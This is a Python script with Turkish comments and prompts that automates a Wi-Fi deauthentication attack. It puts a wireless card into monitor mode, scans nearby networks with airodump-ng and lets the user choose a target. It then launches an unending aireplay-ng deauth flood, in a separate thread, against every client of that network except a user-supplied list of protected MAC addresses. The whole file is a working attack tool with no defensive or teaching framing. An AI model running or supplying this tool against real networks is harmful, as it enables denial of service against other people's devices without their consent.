#!/usr/bin/env python3

import csv
from datetime import datetime
import os
import re
import shutil
import subprocess
import threading
import time

mac_address_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
wlan_code = re.compile("Interface (wlan[0-9]+)")

def check_sudo_privileges():
    """Süper kullanıcı yetkileriyle çalışılıp çalışılmadığını kontrol et."""
    if 'SUDO_UID' not in os.environ:
        print("Bu programı sudo ile çalıştırmalısınız.")
        exit()

def find_network_interfaces():
    """Ağ arayüzlerini bul."""
    result = subprocess.run(["iw", "dev"], capture_output=True).stdout.decode()
    return wlan_code.findall(result)

def set_monitor_mode(interface_name):
    """Ağ arayüzünü monitor moda geçir."""
    subprocess.run(["ip", "link", "set", interface_name, "down"])
    subprocess.run(["airmon-ng", "check", "kill"])
    subprocess.run(["iw", interface_name, "set", "monitor", "none"])
    subprocess.run(["ip", "link", "set", interface_name, "up"])

def set_band_to_monitor(choice, interface_name):
    """Seçilen bantta monitor modu başlat."""
    if choice == "0":
        subprocess.Popen(["airodump-ng", "--band", "bg", "-w", "file", "--write-interval", "1", "--output-format", "csv", interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif choice == "1":
        subprocess.Popen(["airodump-ng", "--band", "a", "-w", "file", "--write-interval", "1", "--output-format", "csv", interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        subprocess.Popen(["airodump-ng", "--band", "abg", "-w", "file", "--write-interval", "1", "--output-format", "csv", interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def backup_csv_files():
    """Mevcut CSV dosyalarını yedekle."""
    directory = os.getcwd()
    for file_name in os.listdir():
        if ".csv" in file_name:
            print("Dizininde .csv dosyaları bulundu, yedekleniyor.")
            try:
                os.mkdir(directory + "/backup/")
            except FileExistsError:
                pass
            timestamp = datetime.now()
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

def check_for_essid(essid, network_list):
    """ESSID'nin listede olup olmadığını kontrol et."""
    if len(network_list) == 0:
        return True
    for item in network_list:
        if essid in item["ESSID"]:
            return False
    return True

def wifi_networks_menu():
    """Kablosuz ağları tarar ve seçim yapmayı sağlar."""
    active_networks = []
    try:
        while True:
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                if ".csv" in file_name:
                    with open(file_name) as csv_file:
                        csv_file.seek(0)
                        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                        csv_reader = csv.DictReader(csv_file, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID" or row["BSSID"] == "Station MAC":
                                continue
                            if check_for_essid(row["ESSID"], active_networks):
                                active_networks.append(row)
            print("Taranıyor. Seçim yapmak için Ctrl+C tuşlayın.\n")
            print("No |\tBSSID              |\tKanal|\tESSID                         |")
            print("___|\t___________________|\t_______|\t______________________________|")
            for index, item in enumerate(active_networks):
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nSeçim yapmaya hazırsınız.")
    while True:
        net_choice = input("Yukarıdan bir seçim yapın: ")
        try:
            return active_networks[int(net_choice)]
        except (IndexError, ValueError):
            print("Lütfen geçerli bir seçim yapın.")

def set_managed_mode(interface_name):
    """Ağ arayüzünü managed moda geri döndür."""
    subprocess.run(["ip", "link", "set", interface_name, "down"])
    subprocess.run(["iwconfig", interface_name, "mode", "managed"])
    subprocess.run(["ip", "link", "set", interface_name, "up"])
    subprocess.run(["service", "NetworkManager", "start"])

def get_clients(bssid, channel, interface_name):
    """Belirli bir ağın istemcilerini tarar."""
    subprocess.Popen(["airodump-ng", "--bssid", bssid, "--channel", channel, "-w", "clients", "--write-interval", "1", "--output-format", "csv", interface_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def deauth_attack(network_mac, target_mac, interface):
    """Hedef MAC adresine deauth saldırısı yap."""
    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", network_mac, "-c", target_mac, interface])

def print_header():
    """Program başlığını yazdır."""
    print(r"""
  ____                  _               _             
 / ___|  ___  _ __ ___ (_) ___  _ __   (_) ___  _ __  
 \___ \ / _ \| '_ ` _ \| |/ _ \| '_ \  | |/ _ \| '_ \ 
  ___) | (_) | | | | | | | (_) | | | | | | (_) | | | |
 |____/ \___/|_| |_| |_|_|\___/|_| |_|_|_|\___/|_| |_|""")
    print("\n****************************************************************")

# Süper kullanıcı yetkilerini kontrol et
check_sudo_privileges()

# CSV dosyalarını yedekle
backup_csv_files()

# Korunacak MAC adreslerini al
macs_not_to_kick_off = []
while True:
    macs = input("Ağdan çıkarmak istemediğiniz cihazların MAC adreslerini girin (birden fazla için virgülle ayırın, örneğin 00:11:22:33:44:55): ")
    macs_not_to_kick_off = [mac.upper() for mac in mac_address_regex.findall(macs)]
    if len(macs_not_to_kick_off) > 0:
        break
    print("Geçerli MAC adresi girmediniz.")

# Tarama bantlarını seç
wifi_controller_bands = ["bg (2.4Ghz)", "a (5Ghz)", "abg (Yavaş olacak)"]
while True:
    print("Lütfen tarama türünü seçin.")
    for index, band in enumerate(wifi_controller_bands):
        print(f"{index} - {band}")
    band_choice = input("Lütfen taramak istediğiniz bantları seçin: ")
    try:
        if wifi_controller_bands[int(band_choice)]:
            band_choice = int(band_choice)
            break
    except (IndexError, ValueError):
        print("Lütfen geçerli bir seçim yapın.")

# Ağ arayüzlerini bul
network_controllers = find_network_interfaces()
if len(network_controllers) == 0:
    print("Lütfen bir ağ arayüzü bağlayın ve tekrar deneyin!")
    exit()

# Arayüz seçimi
while True:
    for index, controller in enumerate(network_controllers):
        print(f"{index} - {controller}")
    controller_choice = input("Lütfen monitor moda geçirmek istediğiniz arayüzü seçin: ")
    try:
        if network_controllers[int(controller_choice)]:
            break
    except (IndexError, ValueError):
        print("Lütfen geçerli bir seçim yapın!")

# Seçilen arayüzü ata
wifi_name = network_controllers[int(controller_choice)]

# Monitor moda geçir
set_monitor_mode(wifi_name)
set_band_to_monitor(str(band_choice), wifi_name)
wifi_network_choice = wifi_networks_menu()
hackbssid = wifi_network_choice["BSSID"]
hackchannel = wifi_network_choice["channel"].strip()

# İstemcileri tarama
get_clients(hackbssid, hackchannel, wifi_name)

# Aktif istemciler ve thread’ler
active_clients = set()
threads_started = []

# Arayüzü doğru kanala ayarla
subprocess.run(["airmon-ng", "start", wifi_name, hackchannel])
try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            if ".csv" in file_name and file_name.startswith("clients"):
                with open(file_name) as csv_file:
                    fieldnames = ["Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs"]
                    csv_reader = csv.DictReader(csv_file, fieldnames=fieldnames)
                    for index, row in enumerate(csv_reader):
                        if index < 5 or row["Station MAC"] in macs_not_to_kick_off:
                            continue
                        active_clients.add(row["Station MAC"])
        print("Station MAC           |")
        print("______________________|")
        for item in active_clients:
            print(f"{item}")
            if item not in threads_started:
                threads_started.append(item)
                t = threading.Thread(target=deauth_attack, args=[hackbssid, item, wifi_name], daemon=True)
                t.start()
        time.sleep(1)
except KeyboardInterrupt:
    print("\nDeauth durduruluyor.")

# Arayüzü managed moda geri döndür
set_managed_mode(wifi_name)
